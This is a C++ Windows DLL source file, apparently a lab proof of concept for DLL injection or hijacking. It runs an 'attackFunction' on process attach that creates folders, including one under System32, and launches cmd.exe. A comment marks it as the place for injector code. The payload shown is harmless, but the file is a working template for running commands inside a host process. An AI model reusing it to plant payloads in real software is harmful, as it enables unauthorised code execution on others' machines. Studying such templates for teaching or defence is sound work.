// dllmain.cpp : Defines the entry point for the DLL application.
/* Author: Himanshu Shekhar
* Company: CDAC-Patna.
*/
#include "pch.h" // use stdfx.h for Visual studio 2017 & earlier.
#include <stdio.h>
#include <Windows.h>
#include <iostream>
#include <fstream> // used for file creation, write information to files and read from the files.

using namespace std;

EXTERN_C void attackFunction() {
    system("md C:\\Users\\Public\\helloPublic");
    std::string command = "md \"C:\\Windows\\System32\\helloSachin\\helloNahiHai\" & pause";
    system(command.c_str());
   // system("md 'C:\\Windows\\System32\\helloworld' & pause");
    system("start cmd.exe");
    // will create a directory.
    //system("start calc.exe"); // our injector code will be included in this function.
}
/* When the system starts or terminates a process or thread, it calls the entry-point function for each loaded DLL using the first thread of the process.
* The system also calls the entry-point function for a DLL when it is loaded or unloaded using the LoadLibrary and FreeLibrary functions.
*/

BOOL APIENTRY DllMain( HMODULE hModule, // handle to DLL module. Value is the Base address of the DLL.
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved // parameter indicates whether the DLL is being loaded statically or dynamically.
)
/* NOTE: 

    If ul_reason_for_call is DLL_PROCESS_ATTACH, lpvReserved is NULL for dynamic loads and non-NULL for static loads.

    If ul_reason_for_call is DLL_PROCESS_DETACH, lpvReserved is NULL if FreeLibrary has been called or the DLL load failed and non-NULL if the process is terminating.

*/
{
    // open a file
    //ofstream fout;
    //fout.open("C:\\helloworld\\temp.txt");
    //fout << "Something happening..." << endl;
    //int count = 0;

    switch (ul_reason_for_call)
    {
        /* Value:1; DLL is being loaded into the virtual address space of the current process as a result of the process starting up or as a result of a call to LoadLibrary.
        * 
        */
    case DLL_PROCESS_ATTACH:
        //fprintf(file, "DLL attach function called...\n");
       // fout << "DLL attach function called.." << endl;
        //count++;
        attackFunction();
        //count++;
        return TRUE;
    case DLL_THREAD_ATTACH:
        /* Value:2;  The current process is creating a new thread.
        * the system calls the entry-point function of all DLLs currently attached to the process. 
        * Note that a DLL's entry-point function is called with this value only by threads created after the DLL is loaded by the process.
        */
       // fprintf(file, "DLL thread attach function called...\n");
        break;
    case DLL_THREAD_DETACH:
        /*Value:3; thread is exiting cleanly.
        */
        //fprintf(file, "DLL thread detach function called ...\n");
        break;
    case DLL_PROCESS_DETACH:
        /* Value: 0; DLL is being unloaded from the virtual address space of the calling process.
        * (the processes has either terminated or called FreeLibrary one time for each time it called LoadLibrary).
        */
        //fprintf(file, "DLL detach function called...\n");
        break;
    }
   // fout << count << endl;
   // fout.close(); // close the file
    return TRUE;
}

